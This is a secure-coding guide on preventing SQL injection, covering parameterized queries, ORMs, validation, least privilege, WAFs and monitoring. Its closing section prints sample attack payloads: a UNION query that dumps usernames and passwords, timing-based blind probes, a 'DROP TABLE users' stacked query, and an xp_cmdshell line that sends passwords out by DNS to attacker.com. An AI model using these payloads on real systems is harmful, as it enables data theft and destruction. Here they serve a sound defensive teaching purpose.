# Comprehensive SQL Injection Prevention

## 1. Parameterized Queries (Foundation)

The essential first layer - separates data from code:
- Queries defined with placeholders
- Parameters bound separately
- Database driver handles escaping
- Works against all injection types

## 2. ORM Usage

High-level abstraction eliminates raw SQL:
- **Sequelize**, **TypeORM**, **Prisma** validate input
- Type safety prevents malformed queries
- Query builders escape automatically
- Migrations prevent schema manipulation

Benefits:
- Compile-time type checking
- Prevents accidental string concatenation
- Consistent parameter handling
- Better testability

## 3. Input Validation

Defense-in-depth before database:
- **Type validation**: Expect integers, get integers
- **Length limits**: Prevent buffer overflows
- **Whitelist patterns**: Regex for known formats
- **Schema validation**: Email, URL, phone formats

## 4. Least Privilege Database Users

Minimize damage on breach:
- Read-only user for queries
- Limited column access (masking)
- No DDL permissions (CREATE/DROP)
- Time-limited credentials
- Per-service database accounts

## 5. Web Application Firewall (WAF)

Network-level protection:
- ModSecurity detects SQL injection patterns
- CloudFlare/AWS WAF blocks suspicious requests
- Rate limiting on suspicious behavior
- Geo-blocking of unusual sources

## 6. SQL Error Handling

Hide database details from users:
- Generic error messages to frontend
- Detailed logs on backend only
- Never expose SQL queries to users
- Prevent blind SQL injection via timing

## 7. Monitoring & Alerting

Detect injection attempts:
- Query logging and analysis
- Alert on unusual SQL patterns
- Monitor failed authentication attempts
- Track slow queries (time-based injection)

## SQL Injection Types

### Classic UNION-Based
```sql
' UNION SELECT NULL, username, password FROM users --
```
Attacker appends SELECT statements to exfiltrate data

### Blind SQL Injection
```sql
'; IF (SELECT COUNT(*) FROM users WHERE admin=1) > 0 WAITFOR DELAY '00:00:05' --
```
Attacker infers data through timing/error messages

### Time-Based Blind
```sql
'; IF (1=1) WAITFOR DELAY '00:00:10' --
```
Delays indicate true conditions; used when no error output

### Second-Order
```
Injection stored in database, triggered later
SELECT * FROM stored_data WHERE comment = [injected]
```

### Stacked Queries
```sql
'; DROP TABLE users; --
```
Multiple statements in single query (some databases)

### Out-of-Band (OOB)
```sql
'; declare @varname varchar(1024); set @varname = (SELECT password FROM users);
exec master.dbo.xp_cmdshell 'nslookup ' + @varname + '.attacker.com'; --
```
Exfiltrates data via DNS/HTTP channels
